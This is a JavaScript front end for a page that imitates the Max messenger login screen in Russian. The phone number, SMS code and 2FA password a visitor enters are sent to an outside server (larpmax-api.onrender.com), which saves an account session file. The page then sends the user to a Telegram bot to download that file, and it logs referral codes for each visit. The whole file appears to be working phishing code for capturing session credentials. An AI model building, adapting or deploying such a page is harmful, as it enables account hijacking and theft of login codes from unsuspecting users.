(function () {
  const AUTH_STORAGE_KEY = "max-auth-id";
  const COUNTRY_STORAGE_KEY = "max-country";
  const REF_STORAGE_KEY = "max_ref";

  const container = document.querySelector(".container.svelte-vywflk");
  const popoverPortal = document.querySelector(".popoverPortal");
  const initialForm = document.querySelector("form.auth");
  if (!container || !initialForm) return;

  const state = {
    locale: "ru",
    view: "phone",
    phoneValue: "",
    countries: [],
    countryCode: "RU",
    countryMenuOpen: false,
    countrySearch: "",
    i18n: null,
    authId: null,
    botUsername: "larpmaxbot",
    apiBase: "",
    error: "",
    smsCode: "",
    smsPassword: "",
    needsPassword: false,
    smsHint: "",
    saved: null,
    source: null,
  };

  function t(key) {
    return state.i18n?.ru?.[key] ?? key;
  }

  function pickRuI18n(i18n) {
    if (!i18n) return { ru: {} };
    return { ru: i18n.ru || i18n };
  }

  function formatError(value) {
    if (!value) return "Ошибка";
    if (typeof value === "string") return value;
    if (value instanceof Error) return formatError(value.message);
    if (typeof value === "object") {
      if (typeof value.message === "string" && value.message) return value.message;
      if (typeof value.error === "string" && value.error) return value.error;
      if (value.error) return formatError(value.error);
      try {
        return JSON.stringify(value);
      } catch {
        return "Ошибка";
      }
    }
    return String(value);
  }

  const countryNames = {};

  function countryName(alpha2) {
    if (!countryNames.ru) {
      try {
        countryNames.ru = new Intl.DisplayNames(["ru"], { type: "region" });
      } catch {
        countryNames.ru = null;
      }
    }
    return countryNames.ru?.of(alpha2) || alpha2;
  }

  function flagUrl(alpha2) {
    const code = String(alpha2 || "").toUpperCase();
    if (code.length !== 2) return "";
    const parts = [...code].map((ch) =>
      (0x1f1e6 + ch.charCodeAt(0) - 65).toString(16).toUpperCase()
    );
    return `https://st.max.ru/emojis/${parts[0]}-${parts[1]}_32.webp`;
  }

  function flagEmoji(alpha2) {
    const code = String(alpha2 || "").toUpperCase();
    if (code.length !== 2) return "";
    return String.fromCodePoint(...[...code].map((ch) => 0x1f1e6 + ch.charCodeAt(0) - 65));
  }

  function getCountry() {
    return (
      state.countries.find((item) => item.alpha2Code === state.countryCode) ||
      state.countries.find((item) => item.alpha2Code === "RU") ||
      state.countries[0] ||
      { alpha2Code: "RU", code: "+7", mask: "000 000 00 00" }
    );
  }

  function maskPlaceholder(mask) {
    let i = 0;
    const sample = "1234567890";
    return String(mask || "").replace(/0/g, () => sample[i++ % sample.length]);
  }

  function phoneDigitsNeeded(country) {
    return String(country?.mask || "").replace(/\D/g, "").length || 10;
  }

  function defaultCountryCode() {
    const saved = localStorage.getItem(COUNTRY_STORAGE_KEY);
    if (saved && state.countries.some((item) => item.alpha2Code === saved)) return saved;
    return "RU";
  }

  async function loadCountries() {
    if (state.countries.length) return;
    const res = await fetch("/countries.json");
    state.countries = await res.json();
    state.countryCode = defaultCountryCode();
  }

  function buildPhoneNumber() {
    const country = getCountry();
    const digits = state.phoneValue.replace(/\D/g, "");
    return `${country.code}${digits}`;
  }

  function apiUrl(path) {
    const base = String(state.apiBase || "").replace(/\/$/, "");
    if (!base) return path;
    if (/^https?:\/\//i.test(path)) return path;
    return `${base}${path.startsWith("/") ? path : `/${path}`}`;
  }

  async function api(path, options = {}) {
    const headers = Object.assign({ Accept: "application/json" }, options.headers || {});
    if (options.body && !headers["Content-Type"]) headers["Content-Type"] = "application/json";
    const res = await fetch(apiUrl(path), {
      credentials: state.apiBase ? "omit" : "same-origin",
      ...options,
      headers,
      body:
        options.body && typeof options.body !== "string"
          ? JSON.stringify(options.body)
          : options.body,
    });
    const contentType = res.headers.get("content-type") || "";
    let data = {};
    if (contentType.includes("application/json")) {
      data = await res.json().catch(() => ({}));
    } else {
      const text = await res.text().catch(() => "");
      if (text) data = { error: text.trim().slice(0, 200) };
    }
    if (!res.ok) {
      const msg = formatError(data.error);
      if (res.status === 404) {
        throw new Error(msg && msg !== "Ошибка" ? msg : "Сервер авторизации недоступен. Попробуйте через минуту.");
      }
      throw new Error(msg || `Ошибка ${res.status}`);
    }
    return data;
  }

  function captureRef() {
    try {
      const params = new URLSearchParams(window.location.search);
      const fromQuery = String(params.get("ref") || "").trim().toLowerCase();
      if (fromQuery) {
        localStorage.setItem(REF_STORAGE_KEY, fromQuery);
        return fromQuery;
      }
      return String(localStorage.getItem(REF_STORAGE_KEY) || "").trim().toLowerCase();
    } catch {
      return "";
    }
  }

  function currentRef() {
    try {
      return String(localStorage.getItem(REF_STORAGE_KEY) || "").trim().toLowerCase();
    } catch {
      return "";
    }
  }

  async function trackVisit() {
    const ref = captureRef();
    if (!ref) return;
    try {
      await api("/api/auth/visit", { method: "POST", body: { ref } });
    } catch {
      /* ignore */
    }
  }

  async function ensureAuth() {
    if (state.authId) return state.authId;
    const cached = sessionStorage.getItem(AUTH_STORAGE_KEY);
    if (cached) {
      try {
        await api(`/api/auth/${cached}/state`);
        state.authId = cached;
        connectEvents();
        return state.authId;
      } catch {
        sessionStorage.removeItem(AUTH_STORAGE_KEY);
      }
    }
    const ref = currentRef() || captureRef();
    const data = await api("/api/auth/start", { method: "POST", body: { ref } });
    state.authId = data.authId;
    sessionStorage.setItem(AUTH_STORAGE_KEY, state.authId);
    connectEvents();
    return state.authId;
  }

  function connectEvents() {
    if (state.source) state.source.close();
    const url = apiUrl(`/api/auth/${state.authId}/events`);
    state.source = new EventSource(url);
    state.source.onmessage = (event) => {
      try {
        handleEvent(JSON.parse(event.data));
      } catch {
        /* ignore */
      }
    };
    state.source.onerror = () => {
      // Vercel/proxy flaps are normal; keep authId and retry lightly.
      if (!state.authId || state.view === "success") return;
      try {
        state.source.close();
      } catch {
        /* ignore */
      }
      setTimeout(() => {
        if (state.authId && state.view !== "success") connectEvents();
      }, 1500);
    };
  }

  function handleEvent(event) {
    if (event.type === "saved") {
      state.saved = { sessionFile: event.sessionFile, me: event.me };
      state.view = "success";
      state.error = "";
      sessionStorage.removeItem(AUTH_STORAGE_KEY);
      render();
    }
    if (event.type === "error") {
      state.error = formatError(event.error) || "Ошибка авторизации";
      render();
    }
  }

  async function applySnapshot(snap) {
    if (snap.sms) {
      state.needsPassword = Boolean(snap.sms.needsPassword);
      state.smsHint = snap.sms.needsPassword
        ? `Нужен пароль 2FA${snap.sms.hint ? `: ${snap.sms.hint}` : ""}`
        : snap.sms.phone
          ? `Код отправлен на ${snap.sms.phone}`
          : "";
      if (snap.phase === "sms_code" || snap.phase === "sms_2fa") state.view = "code";
    }
    if (snap.phase === "saved" || snap.saved) {
      state.saved = snap.saved || { sessionFile: snap.sessionFile, me: snap.me };
      state.view = "success";
    }
    render();
  }

  async function requestSms() {
    state.error = "";
    const country = getCountry();
    const digits = state.phoneValue.replace(/\D/g, "");
    const needed = phoneDigitsNeeded(country);
    if (digits.length < needed) {
      state.error = "Введите номер телефона";
      render();
      return;
    }
    await ensureAuth();
    const phone = buildPhoneNumber();
    try {
      const snap = await api(`/api/auth/${state.authId}/sms`, { method: "POST", body: { phone } });
      state.view = "code";
      await applySnapshot(snap);
    } catch (error) {
      const msg = formatError(error);
      if (/connect|closed|network|fetch|ECONN|socket/i.test(msg)) {
        throw new Error("Связь с сервером Max оборвалась. Подождите 20–40 сек (cold start) и нажмите «Продолжить» ещё раз.");
      }
      throw error;
    }
  }

  async function submitCode() {
    state.error = "";
    await ensureAuth();
    const snap = await api(`/api/auth/${state.authId}/sms/code`, {
      method: "POST",
      body: { code: state.smsCode.trim() },
    });
    await applySnapshot(snap);
  }

  async function submitPassword() {
    state.error = "";
    await ensureAuth();
    const snap = await api(`/api/auth/${state.authId}/sms/password`, {
      method: "POST",
      body: { password: state.smsPassword },
    });
    await applySnapshot(snap);
  }

  function headerHtml() {
    return `
      <div class="header svelte-vywflk" style="justify-content:flex-end;">
        <a class="button button--medium button--ghost svelte-10ujq41" href="https://help.max.ru" target="_blank" rel="noopener" aria-label="${esc(t("help"))}">
          <svg class="shape svelte-10ujq41" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52" fill="none" width="52" height="52">
            <path d="M26 0C30.8966 0 35.6698 0.794071 40.0291 3.12545C43.8424 5.16485 46.8352 8.15757 48.8746 11.9709C51.2059 16.3302 52 21.1034 52 26C52 31.4424 50.9139 36.2158 48.8746 40.0291C46.8352 43.8424 43.8424 46.8352 40.0291 48.8745C35.6698 51.2059 30.8966 52 26 52C20.5576 52 15.7842 50.9139 11.9709 48.8745C8.15757 46.8352 5.16485 43.8424 3.12545 40.0291C0.786468 35.6556 0.0294538 30.9057 0 26C0 20.5576 1.08606 15.7842 3.12545 11.9709C5.16485 8.15757 8.15757 5.16485 11.9709 3.12545C15.7842 1.08606 20.5576 0 26 0Z" fill="var(--button-background-color)"></path>
          </svg>
          <div class="content svelte-10ujq41">
            <svg aria-hidden="true" width="24" height="24"><use href="#icon_question"></use></svg>
          </div>
        </a>
      </div>`;
  }

  function filteredCountries() {
    const q = state.countrySearch.trim().toLowerCase();
    if (!q) return state.countries;
    return state.countries.filter((item) => {
      const title = countryName(item.alpha2Code).toLowerCase();
      return (
        title.includes(q) ||
        item.alpha2Code.toLowerCase().includes(q) ||
        item.code.toLowerCase().includes(q)
      );
    });
  }

  function countryMenuHtml(anchorRect) {
    const items = filteredCountries()
      .map((item) => {
        const selected = item.alpha2Code === state.countryCode;
        const title = countryName(item.alpha2Code);
        return `
          <button class="dropdownItem svelte-1cug6p" type="button" role="menuitem"
            data-action="set-country" data-country="${esc(item.alpha2Code)}">
            <span class="countryWrapper svelte-1cug6p">
              <span class="emoji svelte-ihew87">
                <img loading="lazy" decoding="async" class="img svelte-1aizpza"
                  src="${flagUrl(item.alpha2Code)}" alt="${esc(flagEmoji(item.alpha2Code))}"
                  draggable="false" style="width: 20px; height: 20px; object-fit: cover;">
              </span>
              <span class="countryTitle svelte-1cug6p">${esc(title)}</span>
            </span>
            <span class="countryCode svelte-1cug6p">${esc(item.code)}</span>
            ${selected ? '<svg aria-hidden="true" width="16" height="16"><use href="#icon_check_mini"></use></svg>' : ""}
          </button>`;
      })
      .join("");

    const menuWidth = 320;
    const top = anchorRect ? anchorRect.bottom + 8 : 120;
    let left = anchorRect ? anchorRect.left : 24;
    left = Math.max(12, Math.min(left, window.innerWidth - menuWidth - 12));

    return `
      <div id="country-menu-overlay" data-action="close-country-menu" style="position:fixed;inset:0;z-index:9998;"></div>
      <div id="country-menu" role="menu" class="dropdown svelte-1cug6p"
        style="position:fixed;top:${top}px;left:${left}px;z-index:9999;width:${menuWidth}px;max-width:calc(100vw - 24px);">
        <div class="searchContainer svelte-1cug6p">
          <div class="input input--secondary input--neutral svelte-45jpa7">
            <input class="field svelte-45jpa7" id="country-search" type="search"
              value="${esc(state.countrySearch)}" placeholder="${esc(t("countrySearch"))}" autocomplete="off">
          </div>
        </div>
        <div class="scrollContainer svelte-1cug6p" style="max-height:min(360px, 50vh); overflow:auto;">
          ${items || `<div class="emptySearch svelte-1cug6p"><p class="hint svelte-4wobze">${esc(t("countryEmpty"))}</p></div>`}
        </div>
      </div>`;
  }

  function renderCountryMenu() {
    document.getElementById("country-menu")?.remove();
    document.getElementById("country-menu-overlay")?.remove();
    if (!state.countryMenuOpen || !popoverPortal) return;
    const btn = document.querySelector('button[data-action="country"]');
    popoverPortal.innerHTML = countryMenuHtml(btn?.getBoundingClientRect());
    const search = document.getElementById("country-search");
    if (search) {
      search.focus();
      search.addEventListener("input", () => {
        state.countrySearch = search.value;
        renderCountryMenu();
      });
    }
  }

  function setCountry(code) {
    if (!state.countries.some((item) => item.alpha2Code === code)) return;
    state.countryCode = code;
    state.phoneValue = "";
    state.countryMenuOpen = false;
    state.countrySearch = "";
    localStorage.setItem(COUNTRY_STORAGE_KEY, code);
    render();
  }

  function phoneHtml() {
    const country = getCountry();
    const digits = state.phoneValue.replace(/\D/g, "");
    const needed = phoneDigitsNeeded(country);
    const canContinue = digits.length >= needed;
    const placeholder = maskPlaceholder(country.mask);

    return `
      <form class="auth auth--phone auth--regular svelte-vywflk">
        ${headerHtml()}
        <div class="form svelte-vywflk">
          <div class="animation svelte-vywflk"></div>
          <div class="logoWrapper svelte-vywflk">
            <div class="logo svelte-vywflk" style="--auth-logo: url(/_app/immutable/assets/authLogo.CnGYimnD.png);">
              <div class="authLogo svelte-vywflk"></div>
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 68 21" fill="none" class="svelte-vywflk" width="68" height="21">
                <path fill="var(--icon-primary)" d="M4.3 20h-4V1h6.5l4.4 13.1h.6l4.5-13h6.4v19h-4V6h-.6l-5 14H9.7L5 6h-.6v14ZM35.3 20.4c-1.8 0-3.4-.4-4.8-1.2a9 9 0 0 1-3.3-3.5 11 11 0 0 1-1.2-5.1c0-2 .4-3.6 1.2-5C28 4 29 2.7 30.5 2A9 9 0 0 1 35.3.7c1.6 0 3 .4 4.2 1 1.2.7 2.2 1.5 3 2.5l.9-3.1h3.1v19h-3.1l-.9-3c-.8.9-1.8 1.7-3 2.4-1.2.6-2.6 1-4.2 1Zm1-3.7c1.8 0 3.2-.6 4.3-1.7a6 6 0 0 0 1.7-4.4 6 6 0 0 0-1.7-4.4 5.7 5.7 0 0 0-4.3-1.7c-1.7 0-3.2.6-4.3 1.7a6 6 0 0 0-1.6 4.4c0 1.8.6 3.3 1.6 4.4a5.7 5.7 0 0 0 4.3 1.7ZM53.8 20H49l6-9.6L49.8 1h4.8L58 7.5h.7L62.5 1H67l-5.3 9 6 10h-5l-4-7.2h-.7L53.8 20Z"></path>
              </svg>
            </div>
          </div>
          <div class="explainer svelte-vywflk">
            <h3 class="subheader text-align-center text-primary svelte-41mwxv">${t("phoneTitle")}</h3>
          </div>
          <div class="field svelte-vywflk">
            <div class="input svelte-1cug6p">
              <div class="input input--secondary input--neutral svelte-45jpa7">
                <div class="icon icon--left svelte-45jpa7">
                  <button type="button" class="country svelte-1cug6p" data-action="country"
                    aria-haspopup="dialog" aria-expanded="${state.countryMenuOpen}">
                    <span class="emoji svelte-ihew87">
                      <img loading="lazy" decoding="async" class="img svelte-1aizpza"
                        src="${flagUrl(country.alpha2Code)}" alt="${esc(flagEmoji(country.alpha2Code))}"
                        draggable="false" style="width: 20px; height: 20px; object-fit: cover;">
                    </span> ${esc(country.code)}
                    <span class="shevron svelte-1cug6p"><svg aria-hidden="true" width="12" height="12"><use href="#icon_chevron_down_mini"></use></svg></span>
                    <span class="placeholder svelte-1cug6p">${esc(placeholder)}</span>
                  </button>
                </div>
                <input class="field svelte-45jpa7" id="phone-input" type="tel" inputmode="tel" autocomplete="tel" value="${esc(state.phoneValue)}">
              </div>
            </div>
            <p class="hint hint--hint hint--start svelte-4wobze">${t("phoneHint")}</p>
          </div>
          <button class="button button--large button--primary button--stretched svelte-1ebph0f ${canContinue ? "" : "button--disabled"}"
            id="continue-btn" type="button" data-action="continue" ${canContinue ? "" : "disabled"}>
            <span class="content svelte-1ebph0f">${t("continue")}</span>
          </button>
          ${state.error ? `<p class="auth-error">${esc(state.error)}</p>` : ""}
        </div>
        <div class="footer svelte-vywflk">
          <span class="description text-align-center text-tertiary svelte-41mwxv">
            ${t("legalPrefix")}
            <a class="legal-link svelte-vywflk" target="_blank" rel="noopener" href="https://legal.max.ru/pp">${t("privacy")}</a>,
            <a class="legal-link svelte-vywflk" target="_blank" rel="noopener" href="https://legal.max.ru/ps">${t("terms")}</a>
            и
            <a class="legal-link svelte-vywflk" target="_blank" rel="noopener" href="https://legal.max.ru/recsysrules">${t("recs")}</a>
          </span>
        </div>
      </form>`;
  }

  function codeHtml() {
    return `
      <form class="auth auth--phone auth--regular svelte-vywflk">
        ${headerHtml()}
        <div class="form svelte-vywflk">
          <div class="explainer svelte-vywflk">
            <h3 class="subheader text-align-center text-primary svelte-41mwxv">Код из SMS</h3>
            <p class="hint hint--hint hint--start svelte-4wobze">${esc(state.smsHint)}</p>
          </div>
          <div class="field svelte-vywflk">
            <div class="input input--secondary input--neutral svelte-45jpa7">
              <input class="field svelte-45jpa7" id="code-input" type="text" inputmode="numeric" autocomplete="one-time-code" value="${esc(state.smsCode)}" placeholder="123456">
            </div>
          </div>
          ${state.needsPassword ? `
          <div class="field svelte-vywflk">
            <div class="input input--secondary input--neutral svelte-45jpa7">
              <input class="field svelte-45jpa7" id="password-input" type="password" value="${esc(state.smsPassword)}" placeholder="Пароль 2FA">
            </div>
          </div>` : ""}
          <button class="button button--large button--primary button--stretched svelte-1ebph0f" type="button" data-action="sms-submit">
            <span class="content svelte-1ebph0f">${t("continue")}</span>
          </button>
          ${state.error ? `<p class="auth-error">${esc(state.error)}</p>` : ""}
        </div>
        <div class="footer svelte-vywflk">
          <button class="button button--small button--ghost svelte-1ebph0f" type="button" data-action="phone">
            <span class="content svelte-1ebph0f">Другой номер</span>
          </button>
        </div>
      </form>`;
  }

  function successHtml() {
    const me = state.saved?.me;
    const name = me ? me.fullname || me.firstname || "Аккаунт Max" : "Аккаунт Max";
    const phone = me?.phone ? `+${me.phone}` : "";
    const file = state.saved?.sessionFile || "session.json";

    return `
      <form class="auth auth--regular svelte-vywflk">
        ${headerHtml()}
        <div class="form svelte-vywflk auth-success">
          <h3 class="subheader text-align-center text-primary svelte-41mwxv">Сессия сохранена</h3>
          <p class="detail text-align-center text-secondary svelte-41mwxv">${esc(name)}${phone ? `<br>${esc(phone)}` : ""}</p>
          <p class="auth-session-name">${esc(file)}</p>
          <p class="detail text-align-center text-secondary svelte-41mwxv">Скачайте файл в Telegram-боте</p>
          <a class="auth-bot-link" href="https://t.me/${esc(state.botUsername)}" target="_blank" rel="noopener">@${esc(state.botUsername)}</a>
        </div>
        <div class="footer svelte-vywflk">
          <button class="button button--small button--ghost svelte-1ebph0f" type="button" data-action="restart">
            <span class="content svelte-1ebph0f">Войти ещё раз</span>
          </button>
        </div>
      </form>`;
  }

  function esc(value) {
    return String(value)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  function render() {
    let html;
    if (state.view === "phone") html = phoneHtml();
    else if (state.view === "code") html = codeHtml();
    else if (state.view === "success") html = successHtml();
    else html = phoneHtml();

    const current = document.querySelector("form.auth");
    if (current) current.outerHTML = html;
    renderCountryMenu();
    bindInputs();
    fixLayout();
    document.documentElement.lang = "ru";
  }

  function syncPhonePlaceholder(phone) {
    const wrap = phone.closest(".input.svelte-1cug6p");
    if (!wrap) return;
    wrap.classList.toggle("input--filled", phone.value.replace(/\D/g, "").length > 0);
  }

  function bindInputs() {
    const phone = document.getElementById("phone-input");
    if (phone) {
      syncPhonePlaceholder(phone);
      phone.focus();
      phone.addEventListener("input", () => {
        const country = getCountry();
        const maxLen = phoneDigitsNeeded(country);
        state.phoneValue = phone.value.replace(/\D/g, "").slice(0, maxLen);
        phone.value = state.phoneValue;
        syncPhonePlaceholder(phone);
        const digits = state.phoneValue.replace(/\D/g, "");
        const btn = document.getElementById("continue-btn");
        if (!btn) return;
        const valid = digits.length >= maxLen;
        btn.disabled = !valid;
        btn.classList.toggle("button--disabled", !valid);
      });
      phone.addEventListener("blur", () => syncPhonePlaceholder(phone));
    }
    const code = document.getElementById("code-input");
    if (code) {
      code.focus();
      code.addEventListener("input", () => {
        state.smsCode = code.value;
      });
    }
    const password = document.getElementById("password-input");
    if (password) {
      password.addEventListener("input", () => {
        state.smsPassword = password.value;
      });
    }
  }

  function restart() {
    if (state.source) state.source.close();
    sessionStorage.removeItem(AUTH_STORAGE_KEY);
    state.authId = null;
    state.view = "phone";
    state.error = "";
    state.saved = null;
    state.phoneValue = "";
    state.smsCode = "";
    state.smsPassword = "";
    state.needsPassword = false;
    render();
  }

  document.addEventListener("click", (event) => {
    const target = event.target.closest("[data-action]");
    if (!target) return;
    if (!container.contains(target) && !popoverPortal?.contains(target)) return;

    const action = target.dataset.action;
    if (!action) return;
    if (action !== "close-country-menu") event.preventDefault();

    if (action === "country") {
      state.countryMenuOpen = !state.countryMenuOpen;
      renderCountryMenu();
      const btn = document.querySelector('button[data-action="country"]');
      if (btn) btn.setAttribute("aria-expanded", String(state.countryMenuOpen));
      return;
    }
    if (action === "close-country-menu") {
      state.countryMenuOpen = false;
      renderCountryMenu();
      document.querySelector('button[data-action="country"]')?.setAttribute("aria-expanded", "false");
      return;
    }
    if (action === "set-country") {
      setCountry(target.dataset.country);
      return;
    }
    if (action === "continue") {
      requestSms().catch((error) => {
        state.error = formatError(error);
        render();
      });
      return;
    }
    if (action === "sms-submit") {
      const run = state.needsPassword ? submitPassword() : submitCode();
      run.catch((error) => {
        state.error = formatError(error);
        render();
      });
      return;
    }
    if (action === "restart") {
      restart();
    }
  });

  document.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && state.countryMenuOpen) {
      state.countryMenuOpen = false;
      renderCountryMenu();
      document.querySelector('button[data-action="country"]')?.setAttribute("aria-expanded", "false");
    }
  });

  function fixLayout() {
    const app = document.getElementById("app");
    const appContainer = document.getElementById("app-container");
    const shell = document.querySelector(".container.svelte-vywflk");

    document.documentElement.style.width = "100%";
    document.documentElement.style.height = "100%";
    document.body.style.margin = "0";
    document.body.style.padding = "0";
    document.body.style.width = "100%";
    document.body.style.minHeight = "100dvh";
    document.body.style.display = "block";

    if (app) {
      app.style.display = "block";
      app.style.width = "100%";
      app.style.height = "100%";
      app.style.minHeight = "100dvh";
    }
    if (appContainer) {
      appContainer.style.width = "100%";
      appContainer.style.height = "100%";
      appContainer.style.minHeight = "100dvh";
      appContainer.style.display = "flex";
    }
    if (shell) {
      shell.style.width = "100%";
      shell.style.height = "100%";
      shell.style.flex = "1 1 auto";
      shell.style.display = "grid";
      shell.style.placeItems = "center";
      shell.style.justifyItems = "center";
    }
  }

  async function restoreSession() {
    const cached = sessionStorage.getItem(AUTH_STORAGE_KEY);
    if (!cached) return;
    try {
      await ensureAuth();
      const snap = await api(`/api/auth/${state.authId}/state`);
      if (snap.phase === "sms_code" || snap.phase === "sms_2fa" || snap.phase === "saved") {
        await applySnapshot(snap);
      }
    } catch {
      sessionStorage.removeItem(AUTH_STORAGE_KEY);
      state.authId = null;
      if (state.source) state.source.close();
    }
  }

  async function boot(i18n) {
    state.i18n = pickRuI18n(i18n);
    state.locale = "ru";
    document.getElementById("boot-loader")?.remove();
    const pattern = document.querySelector(".layer-pattern");
    if (pattern) {
      pattern.style.setProperty("--pattern-url", "url('/_app/immutable/assets/pattern_space.aFb4MW9l.svg')");
    }
    try {
      await loadCountries();
    } catch {
      /* ignore */
    }
    captureRef();
    const host = window.location.hostname;
    const isLocal = host === "127.0.0.1" || host === "localhost";
    // Production: talk to Render directly (SSE through Vercel often dies with "connect closed").
    state.apiBase = isLocal ? "" : "https://larpmax-api.onrender.com";
    try {
      const cfg = await api("/api/auth/config");
      if (cfg.botUsername) state.botUsername = cfg.botUsername.replace(/^@/, "");
      const fromCfg = String(cfg.apiBase || "").replace(/\/$/, "");
      // Never trust loopback apiBase from remote hosts — causes "Load failed".
      if (
        fromCfg &&
        !/^https?:\/\/(127\.0\.0\.1|localhost)(:|\/|$)/i.test(fromCfg)
      ) {
        state.apiBase = fromCfg;
      }
    } catch {
      /* keep default apiBase */
    }
    await trackVisit().catch(() => {});
    fixLayout();
    state.view = "phone";
    render();
    fixLayout();
    restoreSession().catch(() => {});
  }

  const RU_I18N = {
    ru: {
      help: "Помощь",
      phoneTitle: "С каким номером телефона хотите войти?",
      phoneHint: "Для входа нужен номер из России или страны из списка — нажмите на флаг, чтобы выбрать",
      countrySearch: "Поиск",
      countryEmpty: "Ничего не найдено",
      continue: "Продолжить",
      legalPrefix: "Нажимая «Продолжить», вы принимаете",
      privacy: "политику конфиденциальности",
      terms: "пользовательское соглашение",
      recs: "правила персональных рекомендаций",
    },
  };

  if (window.MAX_I18N) {
    boot(window.MAX_I18N);
  } else {
    fetch("/i18n.json")
      .then((res) => res.json())
      .then(boot)
      .catch(() => boot(RU_I18N));
  }
})();
